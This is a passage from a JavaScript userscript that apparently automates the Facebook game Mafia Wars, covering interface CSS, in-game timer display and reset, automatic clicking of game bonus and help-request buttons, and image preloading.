                  '#MWAPSettingsBox li a.aboutLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c14_f2.png\');width:58px;height:31px;}'+
                  '#MWAPSettingsBox li.selected a.aboutLink, #MWAPSettingsBox li.selected a.aboutLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c14_f2.png\');width:58px;height:31px;}'+
                  '#MWAPSettingsBox li a.closeLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c15.png\');width:73px;height:31px;}'+
                  '#MWAPSettingsBox li a.closeLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c15_f2.png\');width:73px;height:31px;}'+
                  '#MWAPSettingsBox li a.helpLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r3_c15.png\');width:73px;height:25px;float:right;}'+
                  '#MWAPSettingsBox li a.helpLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r3_c15_f2.png\');width:73px;height:25px;float:right;}'+
                  '#MWAPSettingsBox li a.mwapLink {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c2.png\');width:154px;height:70px;}'+
                  '#MWAPSettingsBox li a.mwapLink:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c2_f2.png\');width:154px;height:70px;}'+
                  '#MWAPSettingsBox li a.donateButton {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c7.png\');width:155px;height:70px;}'+
                  '#MWAPSettingsBox li a.donateButton:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c7_f2.png\');width:155px;height:70px;}'+
                  '#MWAPSettingsBox li a.updateButton {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c10.png\');width:152px;height:70px;}'+
                  '#MWAPSettingsBox li a.updateButton:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c10_f2.png\');width:152px;height:70px;}'+
                  '#MWAPSettingsBox li a.saveButton {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c13.png\');width:154px;height:70px;}'+
                  '#MWAPSettingsBox li a.saveButton:hover {background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c13_f2.png\');width:154px;height:70px;}'+
                  '#MWAPSettingsBox a.settingsLink {text-decoration:none;padding-top:3px;float:right;}'+
                  '#MWAPSettingsBox a.settingsLink:hover {color:#FFF;text-decoration:underline;}'+
                  // ******************* Settings Box Content CSS ******************
                  '#settingsBox {width:762px;height:440px;float:left;background-image:url(\'' + SCRIPT.PSMWAP_imagePath+'mwap_int_web_r3_c2.png\');background-position:center center;background-repeat:no-repeat;color: #BCD2EA;background-color:#000;}' +
                  '#settingsBox .tabcontent{display:none;height:439px;width:762px;top:50px;}' +
                  '#settingsBox label {color: #BCD2EA;vertical-align: middle;}' +
                  '#settingsBox img {vertical-align: middle;}' +
                  '#settingsBox select, #settingsBox textarea {border:1px solid;font-size:12px;text-align:left;vertical-align: middle;}'+
                  '#settingsBox input {border:1px solid;font-size:12px;text-align:right;vertical-align: middle;padding:0px 2px 2px 0px;}'+
                  '#settingsBox div, #settingsBox select, #settingsBox textarea {position: absolute;vertical-align: middle;}' +
                  '#settingsBox img, #settingsBox span, #settingsBox label {position: static;}' +
                  '#settingsBox #generalTab div, #mafiaTab div, #displayTab div, #energyTab div, #healTab div {position: static;}' +
                  '#settingsBox #generalTab select, #mafiaTab select, #displayTab select, #energyTab select, #healTab select {position: static;}' +
                  '#settingsBox #generalTab textarea, #mafiaTab textarea, #displayTab textarea, #energyTab textarea, #healTab textarea {position: static;}' +
                  '#settingsBox #generalTab input, #mafiaTab input, #displayTab input, #energyTab input, #healTab input {position: static; margin: 0;}' +
                  '#settingsBox #generalTab .lhs, #mafiaTab .lhs, #displayTab .lhs, #energyTab .lhs, #healTab .lhs {position: static; width: 180px; float: left; text-align: right; padding: 2px;}' +
                  '#settingsBox #generalTab .rhs, #mafiaTab .rhs, #displayTab .rhs, #energyTab .rhs, #healTab  .rhs {position: static; float: left; padding: 2px;}' +
                  '#settingsBox #generalTab .single, #mafiaTab .single, #displayTab .single, #energyTab .single, #healTab .single {position: static; text-align: center;padding:2px;}' +
                  '#settingsBox #generalTab .hide, #mafiaTab .hide, #displayTab .hide, #energyTab .hide, #healTab .hide {clear: both; visibility: hidden;margin:2px 0px 2px 0px;}' +
                  '#settingsBox #staminaTab div {position: static;}' +
                  '#settingsBox #staminaTab img, span, label {position: static;}' +
                  '#settingsBox #staminaTab select {position: static;}' +
                  '#settingsBox #staminaTab textarea {position: static;}' +
                  '#settingsBox #staminaTab input {position: static; margin: 0;}' +
                  '#settingsBox #staminaTab .lhs {position: static; width: 40%; float: left; text-align: right; padding: 3px;}' +
                  '#settingsBox #staminaTab .rhs {position: static; float: left; padding: 3px;}' +
                  '#settingsBox #staminaTab .single {position: static; text-align: center}' +
                  '#settingsBox #staminaTab .hide {clear: both; visibility: hidden;}' +
                  // ********************** MWAP Log Box CSS **********************
                  '#mafiaLogBox {position: fixed; right: 0px; top: 0px; bottom: 0px; width: 498px; font-size: 12px; z-index: 10001; background-color: black;margin:0px;padding:0px;border:0px;border-style:none;}' +
                  '#mafiaLogBox ul{display:inline;list-style-type:none;float:left;margin:0px;padding:0px;width:498px;border:0px;border-style:none;}' +
                  '#mafiaLogBox li, #mafiaLogBox ul li {display:inline;list-style-type:none;float:left;margin:0px;padding:0px;border:0px;border-style:none;}'+
                  '#mafiaLogBox li a, #mafiaLogBox ul li a {margin:0px;padding:0px;border:0px;border-style:none;float:left;}' +
                  '#mafiaLogBox img{margin:0px; padding:0px;border:0px;border-style:none;}' +
                  '#mafiaLogBox a, #mafiaLogBox div a, #mafiaLogBox ul li div a {border:0px;border-style:none;float:none;clear:both;}' +
                  '#mafiaLogBox li a.pauseLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_10.png\');width:25px;height:30px;}'+
                  '#mafiaLogBox li a.pauseLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_10-over.png\');width:25px;height:30px;}'+
                  '#mafiaLogBox li a.resumeLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_11.png\');width:21px;height:30px;}'+
                  '#mafiaLogBox li a.resumeLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_11-over.png\');width:21px;height:30px;}'+
                  '#mafiaLogBox li a.clearLogLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_05.png\');width:78px;height:30px;}'+
                  '#mafiaLogBox li a.clearLogLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_05-over.png\');width:78px;height:30px;}'+
                  '#mafiaLogBox li a.clearStatsLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_06.png\');width:94px;height:30px;}'+
                  '#mafiaLogBox li a.clearStatsLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_06-over.png\');width:94px;height:30px;}'+
                  '#mafiaLogBox li a.toggleSettingsLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_07.png\');width:70px;height:30px;}'+
                  '#mafiaLogBox li a.toggleSettingsLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_07-over.png\');width:70px;height:30px;}'+
                  '#mafiaLogBox li a.filterActiveLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_08-on.png\');width:58px;height:30px;}'+
                  '#mafiaLogBox li a.filterActiveLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_08-over.png\');width:58px;height:30px;}'+
                  '#mafiaLogBox li a.filterNotActiveLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_08.png\');width:58px;height:30px;}'+
                  '#mafiaLogBox li a.filterNotActiveLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_08-over.png\');width:58px;height:30px;}'+
                  '#mafiaLogBox li a.debugActiveLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_09-on.png\');width:57px;height:30px;}'+
                  '#mafiaLogBox li a.debugActiveLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_09-over.png\');width:57px;height:30px;}'+
                  '#mafiaLogBox li a.debugNotActiveLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_09.png\');width:57px;height:30px;}'+
                  '#mafiaLogBox li a.debugNotActiveLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_09-over.png\');width:57px;height:30px;}'+
                  '#mafiaLogBox li a.closeLink {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_12.png\');width:17px;height:30px;}'+
                  '#mafiaLogBox li a.closeLink:hover {background-image:url(\'http://playerscripts.co.uk/images/mwap_graphics/setlog/logbox2_12-over.png\');width:17px;height:30px;}'+
                   // ********************** Log Box CSS **********************
                  '#mafiaLogBox div.mouseunderline:hover{text-decoration:underline}' +
                  '#mafiaLogBox .logEvent{border-bottom:1px solid #333; padding:4px 0px;color:#999999;}' +
                  '#mafiaLogBox .eventTime{color:#999999; font-size: 10px; width:80px; float:left}' +
                  '#mafiaLogBox .eventBody{width:340px; float:right;color:#999999;}' +
                  '#mafiaLogBox .eventTime,#mafiaLogBox .eventIcon,#mafiaLogBox .eventBody{}' +
                  '#mafiaLogBox .eventBody .good {color:#52E259;font-weight:bold;}' +
                  '#mafiaLogBox .eventBody .bad {color:#EC2D2D;font-weight:bold;}' +
                  '#mafiaLogBox .eventBody .warn {color:#EC2D2D;}' +
                  '#mafiaLogBox .eventBody .money {color:#00CC00;font-weight:bold;}' +
                  '#mafiaLogBox .eventBody .expense {color:#FFD927;}' +
                  '#mafiaLogBox .eventBody .loot {color:#FF6633;}' +
                  '#mafiaLogBox .eventBody .user {color:#FFD927;}' +
                  '#mafiaLogBox .eventBody .attacker {color:#EC2D2D;}' +
                  '#mafiaLogBox .eventBody .job {color:#52E259;font-weight:bold;}' +
                  '#mafiaLogBox .eventBody .property {color:#FFFFFF;font-weight:bold;}' +
                  '#mafiaLogBox .clear{clear:both}' +
                  '#mafiaLogBox .logEvent.Icon{background-repeat: no-repeat; background-position: 82px}' +
                  '#mafiaLogBox .logEvent.process.Icon{background-image:url(' + stripURI(processIcon) + ')}' +
                  '#mafiaLogBox .logEvent.search.Icon{background-image:url(' + stripURI(searchIcon) + ')}' +
                  '#mafiaLogBox .logEvent.warning.Icon{background-image:url(' + stripURI(warningIcon) + ')}' +
                  '#mafiaLogBox .logEvent.info.Icon{background-image:url(' + stripURI(infoIcon) + ')}' +
                  '#mafiaLogBox .logEvent.lootbag.Icon{background-image:url(' + stripURI(lootbagIcon) + ')}' +
                  '#mafiaLogBox .logEvent.killedMobster.Icon{background-image:url(' + stripURI(killedMobsterIcon) + ')}' +
                  '#mafiaLogBox .logEvent.found.Icon{background-image:url(' + stripURI(lootbagIcon) + ')}' +
                  '#mafiaLogBox .logEvent.updateGood.Icon{background-image:url(' + stripURI(updateGoodIcon) + ')}' +
                  '#mafiaLogBox .logEvent.updateBad.Icon{background-image:url(' + stripURI(updateBadIcon) + ')}' +
                  '#mafiaLogBox .logEvent.pause.Icon{background-image:url(' + stripURI(pauseIcon) + ')}' +
                  '#mafiaLogBox .logEvent.play.Icon{background-image:url(' + stripURI(playIcon) + ')}' +
                  '#mafiaLogBox .logEvent.yeah.Icon{background-image:url(' + stripURI(yeahIcon) + ')}' +
                  '#mafiaLogBox .logEvent.omg.Icon{background-image:url(' + stripURI(omgIcon) + ')}' +
                  '#mafiaLogBox .logEvent.experience.Icon{background-image:url(' + stripURI(experienceIcon) + ')}' +
                  '#mafiaLogBox .logEvent.experience.Icon{background-image:url(' + stripURI(experienceIcon) + ')}' +
                  '#mafiaLogBox .logEvent.health.Icon{background-image:url(' + stripURI(healthIcon) + ')}' +
                  '#mafiaLogBox .logEvent.cash.Icon{background-image:url(' + stripURI(cashIcon) + ')}' +
                  '#mafiaLogBox .logEvent.cashCuba.Icon{background-image:url(' + stripURI(cashCubaIcon) + ')}' +
                  '#mafiaLogBox .logEvent.cashMoscow.Icon{background-image:url(' + stripURI(cashMoscowIcon) + ')}' +
                  '#mafiaLogBox .logEvent.cashBangkok.Icon{background-image:url(' + stripURI(cashBangkokIcon) + ')}' +
                  '#mafiaLogBox .logEvent.cashVegas.Icon{background-image:url(' + stripURI(cashVegasIcon) + ')}' +
                  '#mafiaLogBox .logEvent.cashItaly.Icon{background-image:url(' + stripURI(cashItalyIcon) + ')}' +
                  '#mafiaLogBox .logEvent.energyPack.Icon{background-image:url(' + stripURI(energyPackIcon) + ')}' +
                  '#mafiaLogBox .logEvent.healOnIcon.Icon{background-image:url(' + stripURI(healOnIcon) + ')}' +
                  '#mafiaLogBox .logEvent.healOffIcon.Icon{background-image:url(' + stripURI(healOffIcon) + ')}' +
                  '#mafiaLogBox .logEvent.healOnHoldIcon.Icon{background-image:url(' + stripURI(healOnHoldIcon) + ')}' +
                  '#mafiaLogBox .logEvent.staminaIcon.Icon{background-image:url(' + stripURI(staminaIcon) + ')}' +
                  '#mafiaLogBox .logEvent.energyIcon.Icon{background-image:url(' + stripURI(energyIcon) + ')}' +
                  '#mafiaLogBox .logEvent.attackIcon.Icon{background-image:url(' + stripURI(attackIcon) + ')}' +
                  '#mafiaLogBox .logEvent.defenseIcon.Icon{background-image:url(' + stripURI(defenseIcon) + ')}' +
                  '#mafiaLogBox .logEvent.healthIcon.Icon{background-image:url(' + stripURI(healthIcon) + ')}' +
                  // ********************** Energy Tab CSS **********************
                  '#ap_menu span:hover{text-decoration:underline}'+
                  '#ap_menu span{font-size: 12px; font-weight: bold; cursor: pointer; color: #FFD927}' +
                  '.ap_optgroup1 {background-color: #FFFF77; text-align: center; color: #000000; font-weight: bold; font-size: 11px}' +
                  '.ap_optgroup2 {background-color: #996633; text-align: center; color: #FFFFFF; font-size: 10px}' +
                  '.ap_option    {font-size: 10px; cursor: default;}' +
                  '.ap_option:hover {background-color:#660000;}' +
                  '#mwapHelpMenu {z-index: 20; display: none;font-size:12px;width:150px;background-color:#000;margin:-1px 0px 0px 2px;padding:3px;}'+
                  '#mwapHelpMenu a{text-decoration:none;margin:0px;padding:4px 0px 4px 15px;width:135px;float:left;border-left:1px solid #FFF;border-right:1px solid #FFF;background-color:#000;}'+
                  '#mwapHelpMenu a:hover{text-decoration:underline;background-color:#333;}'+
                  '#mwapHelpMenu div{text-decoration:none;margin:0px;padding:4px 0px 4px 10px;width:140px;float:left;border-left:1px solid #FFF;border-right:1px solid #FFF;background-color:#000;}'+
                  // ********************** Preload Images **********************
                  '#PreLoadImages, #PreLoadImages img {display:block;left:-9999px;top:-9999px;}';
    if (newCSS != mwapCSS){  // If CSS has changed, remove the old one and add a new one.
      remakeElement('style', document.getElementsByTagName('head')[0], {'id':'mwapCSS','type':'text/css'}).appendChild(document.createTextNode(newCSS));
    }
  } catch(ex) {
    addToLog('warning Icon', 'BUG DETECTED (refreshMWAPCSS): ' + ex);
  }
}

function showTimers() {
  addToLog('info Icon', '<span style="color:#04B4AE;">Time left on PS MWAP Timers:' +
      '<br>&nbsp;&nbsp;miniPackTimer: ' + getHoursTime('miniPackTimer') +
      '<br>&nbsp;&nbsp;askShopPartsTimer: ' + getHoursTime('askShopPartsTimer') +
      '<br>&nbsp;&nbsp;askDepotPartsTimer: ' + getHoursTime('askDepotPartsTimer') +
      '<br>&nbsp;&nbsp;askArmorPartsTimer: ' + getHoursTime('askArmorPartsTimer') +
      '<br>&nbsp;&nbsp;askZooPartsTimer: ' + getHoursTime('askZooPartsTimer') +
      '<br>&nbsp;&nbsp;askCasinoPartsTimer: ' + getHoursTime('askCasinoPartsTimer') +
      '<br>&nbsp;&nbsp;buildCarTimer: ' + getHoursTime('buildCarTimer') +
      '<br>&nbsp;&nbsp;buildWeaponTimer: ' + getHoursTime('buildWeaponTimer') +
      '<br>&nbsp;&nbsp;buildArmorTimer: ' + getHoursTime('buildArmorTimer') +
      '<br>&nbsp;&nbsp;buildAnimalTimer: ' + getHoursTime('buildAnimalTimer') +
      '<br>&nbsp;&nbsp;buildPortTimer: ' + getHoursTime('buildPortTimer') +
      '<br>&nbsp;&nbsp;takeHourNew York: ' + getHoursTime('takeHourNew York') +
      '<br>&nbsp;&nbsp;takeHourCuba: ' + getHoursTime('takeHourCuba') +
      '<br>&nbsp;&nbsp;takeHourMoscow: ' + getHoursTime('takeHourMoscow') +
      '<br>&nbsp;&nbsp;takeHourBangkok: ' + getHoursTime('takeHourBangkok') +
      '<br>&nbsp;&nbsp;takeHourLas Vegas: ' + getHoursTime('takeHourLas Vegas') +
      '<br>&nbsp;&nbsp;takeHourItaly: ' + getHoursTime('takeHourItaly') +
      '<br>&nbsp;&nbsp;tournamentTimer: ' + getHoursTime('tournamentTimer') +
      '<br>&nbsp;&nbsp;CollectMissionsTimer: ' + getHoursTime('colmissionTimer') +
      '<br>&nbsp;&nbsp;CheckedMyMissionTimer: ' + getHoursTime('checkedmymissionTimer') +
      '<br>&nbsp;&nbsp;rewardEnergyTimer: ' + getHoursTime('rewardEnergyTimer') +
      '<br>&nbsp;&nbsp;autoAskHelponCCTimer: ' + getHoursTime('autoAskHelponCCTimer') +
      '<br>&nbsp;&nbsp;autoLottoTimer: ' + getHoursTime('autoLottoTimer') +
      '<br>&nbsp;&nbsp;AskforHelpMoscowTimer: ' + getHoursTime('AskforHelpMoscowTimer') +
      '<br>&nbsp;&nbsp;AskforHelpBangkokTimer: ' + getHoursTime('AskforHelpBangkokTimer') +
      '<br>&nbsp;&nbsp;AskforHelpVegasTimer: ' + getHoursTime('AskforHelpVegasTimer') +
      '<br>&nbsp;&nbsp;AskforHelpItalyTimer: ' + getHoursTime('AskforHelpItalyTimer') +
      '<br>&nbsp;&nbsp;wishListTimer: ' + getHoursTime('wishListTimer') +
      '<br>&nbsp;&nbsp;autoEnforcedTitleTimer: ' + getHoursTime('autoEnforcedTitleTimer') +
      '<br>&nbsp;&nbsp;warTimer: ' + getHoursTime('warTimer') +
      '<br>&nbsp;&nbsp;askEnergyPackTimer: ' + getHoursTime('askEnergyPackTimer') +
      '<br>&nbsp;&nbsp;dailyCheckListTimer: ' + getHoursTime('dailyCheckListTimer') +
      '<br>&nbsp;&nbsp;autoAcceptMsgTimer: ' + getHoursTime('autoAcceptMsgTimer') +
    '</span>');
  return;
}

function resetTimers(manually) {
  // Reset the timers.
  // 3600 : if an hour has passed
  // 1800 : if half an hour has passed
  // 900  : if 15 minutes have passed
  // 300  : if 5 minutes have passed
  var checkTimer = function(timername, limit) { if (manually || timeLeftGM(timername) < limit) setGMTime(timername, 0); };
//  var checkTimer = function(timername, limit) { if (manually) setGMTime(timername, 0); };

  checkTimer('miniPackTimer', 300);
  checkTimer('wishListTimer', 300);
  checkTimer('autoEnforcedTitleTimer', 1800);
  checkTimer('warTimer', 900);
  checkTimer('buildCarTimer', 900);
  checkTimer('askShopPartsTimer', 900);
  checkTimer('askDepotPartsTimer', 900);
  checkTimer('askArmorPartsTimer', 900);
  checkTimer('askZooPartsTimer', 900);
  checkTimer('askCasinoPartsTimer', 900);
  checkTimer('buildWeaponTimer', 900);
  checkTimer('buildArmorTimer', 900);
  checkTimer('buildAnimalTimer', 900);
  checkTimer('buildPortTimer', 900);
  checkTimer('takeHourNew York', 300);
  checkTimer('takeHourCuba', 300);
  checkTimer('takeHourMoscow', 300);
  checkTimer('takeHourBangkok', 300);
  checkTimer('takeHourLas Vegas', 300);
  checkTimer('takeHourItaly', 300);
  checkTimer('askEnergyPackTimer', 900);
  checkTimer('dailyCheckListTimer', 900);
  checkTimer('autoAskHelponCCTimer', 3600);
  checkTimer('autoLottoTimer', 3600);
  checkTimer('AskforHelpMoscowTimer', 1800);
  checkTimer('AskforHelpBangkokTimer', 1800);
  checkTimer('AskforHelpVegasTimer', 1800);
  checkTimer('AskforHelpItalyTimer', 1800);
  checkTimer('rewardEnergyTimer', 1800);
  checkTimer('checkVaultTimer', 900);
  checkTimer('tournamentTimer', 300);
  checkTimer('colmissionTimer', 600); // 10 min
  checkTimer('checkedmymissionTimer', 120); // 2 min
  checkTimer('autoAcceptMsgTimer',3600);

  addToLog('warning Icon', 'All active timers have been reset.');
  if (manually) {
    alert('All active timers have been reset.');
    // Restart the timers.
    Autoplay.delay = 150;
    Autoplay.start();
    autoReload(false, 'reset timers');
  }
  return;
}

// Perform click actions here
function doQuickClicks() {
  try {
    // Common clicking method
    var doClick = function (xpath, gmFlag) {
      var elt = xpathFirst (xpath);
      if (elt && isGMChecked(gmFlag)) {
        clickElement(elt);
        DEBUG('Clicked button for ' + gmFlag);
        return true;
      }
      return false;
    };

    // Click the level up bonus
    if (doClick('.//a[contains(@onclick,"postLevelUpFeedAndSend(); levelUpBoost();")]', 'autoLevelPublish')) return;

    // Click the achievement bonus
    if (doClick('.//a[contains(.,"Share the wealth!")]', 'autoAchievementPublish')) return;

    // Click the reward button
    if (doClick('.//div//a[@class="sexy_button" and contains(text(),"Reward Friends")]', 'autoWarRewardPublish')) return;
    if (doClick('.//div//a[@class="sexy_button_new short white sexy_call_new" and contains(text(),"Reward Friends")]', 'autoWarRewardPublish')) return;

    // Click the 'Call for Help!' button
    if (doClick('.//div//a[@class="sexy_button_new short white sexy_call_new" and contains(.,"Ask Friends for Help!")]', 'autoWarResponsePublish')) return;

    // Click the 'Rally More Help!' button
    if (doClick('.//div//a[@class="sexy_button_new short white sexy_call_new" and contains(text(),"Rally More Help")]', 'autoWarRallyPublish')) return;


   if(!timeLeftGM('dailyCheckListTimer')){
      DEBUG('Claiming Daily Take');
      setGMTime('dailyCheckListTimer', '4 hours');
      // Get daily checklist bonus
      if (doClick('.//div//a[contains(.,"Daily Take")]', 'autoDailyTake')) return;
    }

    // NewHome Ask for Energy Packs
    if(isGMChecked('askEnergyPack') && onNewHome() && !timeLeftGM('askEnergyPackTimer')){
      DEBUG('Asking for Energy');
      var EnergyContainer = xpathFirst('//div[@id="empire_wait_pack_area" and contains(@style,"block")]', innerPageElt);
      if(EnergyContainer) {
        DEBUG('Asking for Energy - Container Found');
        var EnergyContainerAsk = xpathFirst('//a[@class="empire_wait_ask_button sexy_button_new sexy_call_new fl" and contains(.,"Ask")]', EnergyContainer);
        if(EnergyContainerAsk) {
          DEBUG('Asking for Energy - Ask button Found');
          clickElement(EnergyContainerAsk);
          addToLog('info Icon','Clicked to ask your mafia for Energy Packs.');
          setGMTime('askEnergyPackTimer', '4 hours');
        }
      } else DEBUG('Asking for Energy - Container NOT Found')
    }

    if(!timeLeftGM('askEnergyPackTimer')){
      DEBUG('Asking Mafia for Energy Packs');
      // Ask your mafia to send you energy Packs

      if(isGMChecked('askEnergyPack') && onHome()){
        var EnergyContainer, EnergyContainerTitle;
        EnergyContainer = xpathFirst('//div[@id="mbox_energy_use_container_title"]', innerPageElt);
        if(EnergyContainer) {
          DEBUG('Ask Energy: EnergyContainer Found');
          EnergyContainerTitle = EnergyContainer.innerHTML.untag();
          if(EnergyContainerTitle.match(/(\d+)\s+?Energy/)) {
            var energyPacksAmt = parseInt(RegExp.$1);
            DEBUG('Ask Energy: Current Amt of Energy Packs is '+energyPacksAmt);

            if(energyPacksAmt <= 5){
              DEBUG('Ask Energy: Current Amt of Energy Packs <= 5 - Looking for energyAskContainer');
              var EnergyAskContainer = xpathFirst('//div[@id="clock_energy_pack_ask_mbox"]', innerPageElt);
              if(EnergyAskContainer){
                DEBUG('Ask Energy: energyAskContainer Found - Looking for Link');
                var actionLink = xpathFirst('.//a[@class="sexy_button_new short white sexy_announce_gray" and contains(.,"Ask your mafia for energy")]', EnergyAskContainer);
                if(actionLink) {
                  DEBUG('Ask Energy: energyAskContainer Found - White link found so clicking Link');
                  clickElement(actionLink);
                  addToLog('info Icon','Clicked to ask your mafia for Energy Packs.');
                } else {
                  DEBUG('Ask Energy: energyAskContainer Found - Link not Found or not available atm.');
                }
              }
            }
          } else {
            DEBUG('Ask Energy: Current Amt of Energy Packs not found');
          }
        }
        setGMTime('askEnergyPackTimer', '4 hours');
      }
    }

    // Reward your mafia for sending you energy Packs
    var actionElt = xpathFirst('.//div[@id="mbox_energy_timer_container"]', innerPageElt);
    if (isGMChecked('rewardEnergyPack') && !timeLeftGM('rewardEnergyTimer') && actionElt) {
      var actionLink = xpathFirst('//a[contains(text(), "Show more")]', innerPageElt);
      if (actionLink) {
        clickElement(actionLink);
        addToLog('info Icon','Clicked to reward your mafia for Energy Packs.');
      }
      setGMTime('rewardEnergyTimer', '4 hours');
      return;
    }

    // Click hide action box elements
    var hideElts = xpath('.//a[contains(@onclick,"xw_action=dismiss_message")]', innerPageElt);
    for (var i = 0, iLength = hideElts.snapshotLength; i < iLength; ++i) {
      if (hideElts.snapshotItem(i)) clickElement(hideElts.snapshotItem(i));
    }

    // Click mystery gift elements
    var mysteryElts = xpath('.//div[@class="msg_box_div_contents" and contains(.,"Mystery")]', innerPageElt);
    for (var i = 0, iLength = mysteryElts.snapshotLength; i < iLength; ++i) {
      if (mysteryElts.snapshotItem(i) && !/display: none/.test(mysteryElts.snapshotItem(i).innerHTML)) {
        var linkElt = getActionLink (mysteryElts.snapshotItem(i), 'Open It!');
        if (linkElt) clickElement(linkElt);
      }
    }

    var featJobsElt = xpathFirst('.//div[contains(@style,"graphics/featjob/")]', innerPageElt);
    if (isGMChecked('featJob') && onHome() && featJobsElt) {
      var collectElt = getActionLink (featJobsElt, 'Collect!');
      var chooseElt = getActionLink (featJobsElt, 'Choose Job');
      var jobIndex = parseInt(GM_getValue('featJobIndex',0)) + 1;
      var jobElt = xpathFirst('.//a[contains(@onclick,"xw_action=do_holiday_job") and ' +
                              'contains(@onclick,"job_period_id='+jobIndex+'")]', featJobsElt);

      var energyReq = 30;
      switch (jobIndex) {
        case 1: energyReq = 30; break;
        case 2: energyReq = 60; break;
        case 3: energyReq = 100;
      }

      // Collect Bonus from feature jobs
      if (collectElt) {
        clickElement(collectElt);
        addToLog('yeah Icon', 'Clicked to collect bonus from featured job.');

      // Do featured job
      } else if (energy >= energyReq && jobElt) {
        clickElement(jobElt);
        addToLog('yeah Icon', 'Clicked to peform featured job -> '+featJobNames[jobIndex - 1]+'.');

      // Choose job
      } else if (energy >= energyReq && chooseElt) {
        clickElement(linkElt);
      }
    }
  } catch (ex) {
    DEBUG('Error @doQuickClicks: ' + ex);
  }
}

////
// Parse certain messages appearing on the message window
function doParseMessages() {
  var msgs = $x('//td[@class="message_body"]');
  if (msgs && msgs.length > 0) {
    for (var i = 0, iLength=msgs.length; i < iLength; ++i) {
      // Log Minipack kick-off
      if (/Mini[\s\w]+Buff/i.test(msgs[i].innerHTML)) {
        addToLog('yeah Icon', msgs[i].innerHTML);
        setGMTime('miniPackTimer', '8 hours');
      }
    }
  }
}

function preloadMWAPImages() {
  if(document.getElementById('PreLoadImages')) return;

  var preload_Images = makeElement('div', document.body, {'id':'PreLoadImages', 'style':'position: absolute; top: -9999px; left:-9999px;'});
  var preload_Images_Inner =
    //MWAP Settings Box Link Images
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r1_c1.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r1_c2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r1_c16.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c1.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c3.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c4.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c5.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c6.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c8.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c9.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c11.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c12.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c14.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c15.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r2_c16.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r3_c1.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r3_c15.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r3_c16.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c1.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c2.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c4.png">' +
    '<img src="'+SCRIPT.PSMWAP_imagePath+'mwap_int_web_r5_c7.png">' +
